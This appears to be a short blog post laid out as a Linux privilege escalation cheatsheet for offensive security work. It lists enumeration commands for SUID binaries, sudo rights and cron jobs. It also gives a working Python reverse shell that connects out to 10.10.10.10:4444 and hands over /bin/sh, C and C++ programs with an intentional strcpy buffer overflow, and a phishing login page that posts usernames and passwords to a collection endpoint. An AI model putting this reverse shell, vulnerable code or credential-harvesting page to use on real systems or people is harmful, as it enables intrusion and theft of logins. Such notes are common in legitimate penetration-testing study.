---
title: Linux Privilege Escalation Cheatsheet
date: 2026-08-08 06:10:00
categories: Cheatsheets
tags:
  - linux
  - privesc
---

Quick reference commands — replace/expand with your own notes.

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo rights
sudo -l

# Cron jobs
cat /etc/crontab

# Kernel version
uname -a
```

Python reverse shell one-liner:

```python
import socket, subprocess, os

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    for fd in (0, 1, 2):
        os.dup2(s.fileno(), fd)
    subprocess.call(["/bin/sh", "-i"])

connect("10.10.10.10", 4444)
```

Minimal C buffer overflow PoC:

```c
#include <stdio.h>
#include <string.h>

void vuln(char *input) {
    char buf[64];
    strcpy(buf, input); // no bounds check
}

int main(int argc, char **argv) {
    vuln(argv[1]);
    return 0;
}
```

C++ equivalent:

```cpp
#include <iostream>
#include <cstring>

void vuln(const char *input) {
    char buf[64];
    std::strcpy(buf, input);
}

int main(int argc, char **argv) {
    vuln(argv[1]);
    return 0;
}
```

Basic phishing landing page skeleton:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
</head>
<body>
  <form action="/collect" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Sign in</button>
  </form>
</body>
</html>
```
